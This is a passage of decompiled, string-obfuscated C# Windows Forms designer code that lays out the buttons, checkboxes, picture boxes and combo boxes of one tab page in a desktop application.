		((Control)tabPage4).Controls.Add((Control)(object)comboBox14);
		((Control)tabPage4).Controls.Add((Control)(object)label51);
		((Control)tabPage4).Controls.Add((Control)(object)comboBox15);
		((Control)tabPage4).Controls.Add((Control)(object)label52);
		((Control)tabPage4).Controls.Add((Control)(object)comboBox16);
		((Control)tabPage4).Controls.Add((Control)(object)label53);
		((Control)tabPage4).Controls.Add((Control)(object)comboBox18);
		((Control)tabPage4).Controls.Add((Control)(object)textBox32);
		((Control)tabPage4).Controls.Add((Control)(object)textBox33);
		((Control)tabPage4).Controls.Add((Control)(object)textBox34);
		((Control)tabPage4).Controls.Add((Control)(object)label54);
		((Control)tabPage4).Controls.Add((Control)(object)label57);
		((Control)tabPage4).Controls.Add((Control)(object)label58);
		((Control)tabPage4).Controls.Add((Control)(object)label59);
		((Control)tabPage4).Controls.Add((Control)(object)label60);
		((Control)tabPage4).Controls.Add((Control)(object)textBox35);
		((Control)tabPage4).Controls.Add((Control)(object)textBox36);
		((Control)tabPage4).Controls.Add((Control)(object)textBox37);
		((Control)tabPage4).Controls.Add((Control)(object)label61);
		((Control)tabPage4).Controls.Add((Control)(object)label62);
		((Control)tabPage4).Controls.Add((Control)(object)label63);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox13);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox14);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox15);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox16);
		((Control)tabPage4).Controls.Add((Control)(object)button49);
		((Control)tabPage4).Controls.Add((Control)(object)button50);
		((Control)tabPage4).Controls.Add((Control)(object)label64);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox17);
		((Control)tabPage4).Controls.Add((Control)(object)button51);
		((Control)tabPage4).Controls.Add((Control)(object)button52);
		((Control)tabPage4).Controls.Add((Control)(object)button53);
		((Control)tabPage4).Controls.Add((Control)(object)button54);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox18);
		((Control)tabPage4).Controls.Add((Control)(object)button55);
		((Control)tabPage4).Controls.Add((Control)(object)pictureBox19);
		((Control)tabPage4).Controls.Add((Control)(object)button56);
		((Control)tabPage4).Controls.Add((Control)(object)progressBar3);
		((Control)tabPage4).Controls.Add((Control)(object)label65);
		((Control)tabPage4).Controls.Add((Control)(object)button57);
		tabPage4.Location = new Point(4, 54);
		((Control)tabPage4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x137423EF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((Control)tabPage4).Padding = new Padding(3);
		((Control)tabPage4).Size = new Size(1251, 705);
		tabPage4.TabIndex = 4;
		((Control)tabPage4).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B02B8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63);
		((Control)button33).BackColor = Color.Teal;
		((Control)button33).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8C502 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button33).ForeColor = SystemColors.ControlLightLight;
		((Control)button33).Location = new Point(1125, 1);
		((Control)button33).Margin = new Padding(5, 3, 5, 3);
		((Control)button33).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB102F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f);
		((Control)button33).Size = new Size(107, 38);
		((Control)button33).TabIndex = 192;
		((Control)button33).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A639147 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427);
		((ButtonBase)button33).UseVisualStyleBackColor = false;
		((Control)button33).Click += button33_Click;
		((Control)button34).BackColor = Color.Teal;
		((Control)button34).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB4015 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button34).ForeColor = SystemColors.ControlLightLight;
		((Control)button34).Location = new Point(800, 1);
		((Control)button34).Margin = new Padding(5, 3, 5, 3);
		((Control)button34).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F18D68 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)button34).Size = new Size(107, 38);
		((Control)button34).TabIndex = 191;
		((Control)button34).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C9AA2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823);
		((ButtonBase)button34).UseVisualStyleBackColor = false;
		((Control)button34).Click += button34_Click;
		((Control)button35).BackColor = Color.Teal;
		((Control)button35).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AC6C7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button35).ForeColor = SystemColors.ControlLightLight;
		((Control)button35).Location = new Point(415, 1);
		((Control)button35).Margin = new Padding(5, 3, 5, 3);
		((Control)button35).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002A255 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((Control)button35).Size = new Size(107, 38);
		((Control)button35).TabIndex = 190;
		((Control)button35).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0F2DD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a);
		((ButtonBase)button35).UseVisualStyleBackColor = false;
		((Control)button35).Click += button35_Click;
		((Control)pictureBox11).Location = new Point(979, 494);
		((Control)pictureBox11).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FEB138 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe);
		((Control)pictureBox11).Size = new Size(18, 23);
		pictureBox11.SizeMode = (PictureBoxSizeMode)4;
		pictureBox11.TabIndex = 189;
		pictureBox11.TabStop = false;
		((Control)pictureBox12).Location = new Point(1089, 496);
		((Control)pictureBox12).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A63BBF3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427);
		((Control)pictureBox12).Size = new Size(18, 23);
		pictureBox12.TabIndex = 188;
		pictureBox12.TabStop = false;
		((Control)button36).BackColor = Color.Green;
		((Control)button36).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EB93C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9), 8f, (FontStyle)1);
		((Control)button36).ForeColor = SystemColors.ControlLightLight;
		((Control)button36).Location = new Point(765, 642);
		((Control)button36).Margin = new Padding(5, 3, 5, 3);
		((Control)button36).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A6B2C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((Control)button36).Size = new Size(71, 23);
		((Control)button36).TabIndex = 187;
		((Control)button36).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2B2D7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((ButtonBase)button36).UseVisualStyleBackColor = false;
		((Control)button36).Click += button36_Click;
		((Control)button37).BackColor = Color.Green;
		((Control)button37).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C297673 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b), 8f, (FontStyle)1);
		((Control)button37).ForeColor = SystemColors.ControlLightLight;
		((Control)button37).Location = new Point(774, 468);
		((Control)button37).Margin = new Padding(5, 3, 5, 3);
		((Control)button37).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -1737824333 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad);
		((Control)button37).Size = new Size(71, 23);
		((Control)button37).TabIndex = 186;
		((Control)button37).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740945 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((ButtonBase)button37).UseVisualStyleBackColor = false;
		((Control)button37).Click += button37_Click;
		((Control)button38).BackColor = Color.Blue;
		((Control)button38).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF3F52 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a), 10f, (FontStyle)1);
		((Control)button38).ForeColor = SystemColors.ControlLightLight;
		((Control)button38).Location = new Point(10, 76);
		((Control)button38).Margin = new Padding(5, 3, 5, 3);
		((Control)button38).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0E6C1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e);
		((Control)button38).Size = new Size(124, 38);
		((Control)button38).TabIndex = 185;
		((Control)button38).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DA8A67 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((ButtonBase)button38).UseVisualStyleBackColor = false;
		((Control)button38).Click += button38_Click;
		((Control)button39).BackColor = Color.MediumOrchid;
		((Control)button39).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10943 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button39).ForeColor = SystemColors.ControlLightLight;
		((Control)button39).Location = new Point(380, 428);
		((Control)button39).Margin = new Padding(5, 3, 5, 3);
		((Control)button39).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12236E92 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((Control)button39).Size = new Size(115, 38);
		((Control)button39).TabIndex = 184;
		((Control)button39).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DC50D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d);
		((ButtonBase)button39).UseVisualStyleBackColor = false;
		((Control)button39).Click += button39_Click;
		((Control)checkBox9).AutoSize = true;
		((Control)checkBox9).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x222B2BE6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_4a30e34068e34f6f9ca741119ec24a63), 10f, (FontStyle)1);
		((Control)checkBox9).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox9).Location = new Point(1110, 493);
		((Control)checkBox9).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox9).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BFB75A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((Control)checkBox9).Size = new Size(115, 20);
		((Control)checkBox9).TabIndex = 183;
		((Control)checkBox9).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D44C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((ButtonBase)checkBox9).UseVisualStyleBackColor = true;
		checkBox9.CheckedChanged += checkBox9_CheckedChanged;
		((Control)checkBox10).AutoSize = true;
		((Control)checkBox10).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2319F0BE ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8af4c72c2bf24df2961c47634b9fc94e), 10f, (FontStyle)1);
		((Control)checkBox10).ForeColor = SystemColors.ControlLightLight;
		((Control)checkBox10).Location = new Point(1001, 495);
		((Control)checkBox10).Margin = new Padding(5, 3, 5, 3);
		((Control)checkBox10).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC12632 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06);
		((Control)checkBox10).Size = new Size(80, 20);
		((Control)checkBox10).TabIndex = 182;
		((Control)checkBox10).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C9B96 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823);
		((ButtonBase)checkBox10).UseVisualStyleBackColor = true;
		checkBox10.CheckedChanged += checkBox10_CheckedChanged;
		((Control)button40).BackColor = Color.Green;
		((Control)button40).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54C10D48 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_79a180699bf54d4d83e647d26385348a), 8f, (FontStyle)1);
		((Control)button40).ForeColor = SystemColors.ControlLightLight;
		((Control)button40).Location = new Point(966, 585);
		((Control)button40).Margin = new Padding(5, 3, 5, 3);
		((Control)button40).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A6BA2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((Control)button40).Size = new Size(71, 23);
		((Control)button40).TabIndex = 181;
		((Control)button40).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD6C9A2C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5b0fe3a425954f52ae9caf2769498823);
		((ButtonBase)button40).UseVisualStyleBackColor = false;
		((Control)button40).Click += button40_Click;
		((Control)button41).BackColor = Color.Green;
		((Control)button41).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD04475C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_429d35516f59415f9df9c1fe0976e925), 8f, (FontStyle)1);
		((Control)button41).ForeColor = SystemColors.ControlLightLight;
		((Control)button41).Location = new Point(1134, 585);
		((Control)button41).Margin = new Padding(5, 3, 5, 3);
		((Control)button41).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8ED76 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)button41).Size = new Size(71, 23);
		((Control)button41).TabIndex = 180;
		((Control)button41).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11AC5DF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2);
		((ButtonBase)button41).UseVisualStyleBackColor = false;
		((Control)button41).Click += button41_Click;
		((Control)button42).BackColor = Color.Green;
		((Control)button42).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0F14B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a), 8f, (FontStyle)1);
		((Control)button42).ForeColor = SystemColors.ControlLightLight;
		((Control)button42).Location = new Point(727, 585);
		((Control)button42).Margin = new Padding(5, 3, 5, 3);
		((Control)button42).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B71A0A0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33);
		((Control)button42).Size = new Size(71, 23);
		((Control)button42).TabIndex = 179;
		((Control)button42).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x736E0FBD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_3236a4e0edc64b94986eb76d39096e40);
		((ButtonBase)button42).UseVisualStyleBackColor = false;
		((Control)button42).Click += button42_Click;
		((Control)button43).BackColor = Color.Green;
		((Control)button43).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22F1A40E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586), 8f, (FontStyle)1);
		((Control)button43).ForeColor = SystemColors.ControlLightLight;
		((Control)button43).Location = new Point(1135, 529);
		((Control)button43).Margin = new Padding(5, 3, 5, 3);
		((Control)button43).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x22DAA14B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_dcdaa6b2b9864be395d7b1ef5fda91ed);
		((Control)button43).Size = new Size(71, 23);
		((Control)button43).TabIndex = 178;
		((Control)button43).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A41EA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((ButtonBase)button43).UseVisualStyleBackColor = false;
		((Control)button43).Click += button43_Click;
		((Control)button44).BackColor = Color.Green;
		((Control)button44).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA0017 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208), 8f, (FontStyle)1);
		((Control)button44).ForeColor = SystemColors.ControlLightLight;
		((Control)button44).Location = new Point(933, 529);
		((Control)button44).Margin = new Padding(5, 3, 5, 3);
		((Control)button44).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678F98A5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa);
		((Control)button44).Size = new Size(71, 23);
		((Control)button44).TabIndex = 177;
		((Control)button44).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x30028947 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((ButtonBase)button44).UseVisualStyleBackColor = false;
		((Control)button44).Click += button44_Click;
		((Control)button45).BackColor = Color.Green;
		((Control)button45).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2023214386 ^ -1664537520 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_13ebf17f56b549d9971d1dc2218be2ad), 8f, (FontStyle)1);
		((Control)button45).ForeColor = SystemColors.ControlLightLight;
		((Control)button45).Location = new Point(706, 529);
		((Control)button45).Margin = new Padding(5, 3, 5, 3);
		((Control)button45).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DAA2833 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8ecef0c4e6e47e98be39ecaecaed208);
		((Control)button45).Size = new Size(71, 23);
		((Control)button45).TabIndex = 176;
		((Control)button45).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D5C6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((ButtonBase)button45).UseVisualStyleBackColor = false;
		((Control)button45).Click += button45_Click;
		((Control)button46).BackColor = Color.Green;
		((Control)button46).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F3E9B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a), 8f, (FontStyle)1);
		((Control)button46).ForeColor = SystemColors.ControlLightLight;
		((Control)button46).Location = new Point(206, 529);
		((Control)button46).Margin = new Padding(5, 3, 5, 3);
		((Control)button46).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12236DC8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((Control)button46).Size = new Size(71, 23);
		((Control)button46).TabIndex = 175;
		((Control)button46).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002885F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9);
		((ButtonBase)button46).UseVisualStyleBackColor = false;
		((Control)button46).Click += button46_Click;
		((Control)button47).BackColor = Color.Green;
		((Control)button47).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740A5D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76), 8f, (FontStyle)1);
		((Control)button47).ForeColor = SystemColors.ControlLightLight;
		((Control)button47).Location = new Point(95, 466);
		((Control)button47).Margin = new Padding(5, 3, 5, 3);
		((Control)button47).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0x33364240 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc);
		((Control)button47).Size = new Size(66, 23);
		((Control)button47).TabIndex = 174;
		((Control)button47).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x128D5C6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3);
		((ButtonBase)button47).UseVisualStyleBackColor = false;
		((Control)button47).Click += button47_Click;
		comboBox11.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox11).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13740A5D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76), 10f, (FontStyle)1);
		((ListControl)comboBox11).FormattingEnabled = true;
		comboBox11.Items.AddRange(new object[64]
		{
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4E9DEC17 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a776cf8355904954880bec635953b75d),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC12504 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3BD0E5D9 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e52265234ff4c2a9724c7236ffbb26e),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x41E0DAFF ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_88e9930f59e44575938220c3d0d1476a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BFB44C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875F1E5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC92126 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3E520 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3002A069 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fe963489b71c4328899bd0cc4b7f7da9),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A6930 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf),
			gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1602055031 ^ -80085420 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e),
